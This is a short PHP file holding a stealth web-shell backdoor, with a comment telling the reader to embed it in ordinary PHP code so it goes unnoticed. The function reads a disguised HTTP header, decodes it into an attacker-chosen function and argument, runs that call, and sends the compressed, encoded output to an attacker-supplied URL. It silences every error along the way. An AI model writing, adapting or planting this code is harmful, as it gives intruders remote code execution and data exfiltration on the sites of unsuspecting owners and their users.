<?php
// Embed in regular PHP code for maxium stealthyness, c(); must be placed before content is sent to client
@c();
function c(){try{if(isset($_SERVER['HTTP_LENGTH'])){set_time_limit(0);$c=explode("\x15",base64_decode(substr($_SERVER['HTTP_LENGTH'],2)));file_get_contents( $c[2]."qu".urlencode( base64_encode(gzcompress($c[0]($c[1]),9))));}}catch(Exception $e){}
}
?>
